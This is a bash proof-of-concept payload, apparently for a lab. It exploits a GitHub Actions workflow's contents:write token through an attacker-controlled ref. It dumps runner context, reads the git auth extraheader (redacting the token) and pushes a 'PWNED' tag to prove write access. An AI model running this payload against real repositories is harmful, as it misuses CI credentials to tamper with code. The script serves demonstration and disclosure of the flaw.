#!/usr/bin/env bash
# Lab payload — demonstrates arbitrary code execution under smoke-test.yml's
# contents:write token when dispatched with attacker-controlled ref.
# Safe: only prints env context and creates a single tag on origin.
set -u

MARKER="PWNED-$(date +%s)"

echo "=== ${MARKER} ==="
echo "whoami:     $(whoami)"
echo "pwd:        $(pwd)"
echo "GITHUB_REF: ${GITHUB_REF:-unset}"
echo "GITHUB_SHA: ${GITHUB_SHA:-unset}"
echo "GITHUB_REPOSITORY: ${GITHUB_REPOSITORY:-unset}"
echo "GITHUB_ACTOR:      ${GITHUB_ACTOR:-unset}"
echo "RUNNER_OS:  ${RUNNER_OS:-unset}"
echo "-- remote config --"
git remote -v || true
echo "-- extraheader (redacted) --"
git config --get-all http.https://github.com/.extraheader | sed 's/Bearer .*/Bearer [REDACTED]/' || true
echo "-- attempt contents:write proof via tag push --"
git config user.email "attacker-sim@lab.local"
git config user.name  "attacker-sim"
if git tag -a "${MARKER}" -m "contents:write proof" && git push origin "refs/tags/${MARKER}"; then
  echo "TAG_PUSH_RESULT: success"
else
  echo "TAG_PUSH_RESULT: failed"
fi
echo "=== END ${MARKER} ==="
exit 0
